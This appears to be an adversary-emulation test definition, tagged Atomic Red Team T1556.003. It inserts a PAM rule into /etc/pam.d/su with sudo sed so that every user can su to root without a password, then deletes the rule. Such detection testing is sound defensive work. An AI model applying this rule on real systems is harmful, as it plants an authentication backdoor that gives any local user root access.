{
  "id": "b17eacac-282d-4ca8-a240-46602cf863e3",
  "name": "Malicious PAM rule (freebsd)",
  "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "a3de78c9-ccda-4417-b076-5c7c4540ea9e",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "10d26307-aa06-4470-9fb2-c0de8c115e59",
      "type": "execute-command",
      "data": {
        "command": "sudo sed -i \"\" \"/#{pam_rule}/d\" #{path_to_pam_conf}\n",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a3de78c9-ccda-4417-b076-5c7c4540ea9e",
      "p": "on-success",
      "o": "10d26307-aa06-4470-9fb2-c0de8c115e59"
    },
    {
      "s": "a3de78c9-ccda-4417-b076-5c7c4540ea9e",
      "p": "on-failure",
      "o": "10d26307-aa06-4470-9fb2-c0de8c115e59"
    }
  ],
  "tags": [
    "T1556.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "pam_rule",
      "type": "string",
      "description": "Rule to add to the PAM config.",
      "value": "auth sufficient pam_succeed_if.so uid \u003e= 0"
    },
    {
      "name": "index",
      "type": "integer",
      "description": "Index where the rule is inserted.",
      "value": "8"
    },
    {
      "name": "path_to_pam_conf",
      "type": "string",
      "description": "PAM config file to modify.",
      "value": "/etc/pam.d/su"
    }
  ]
}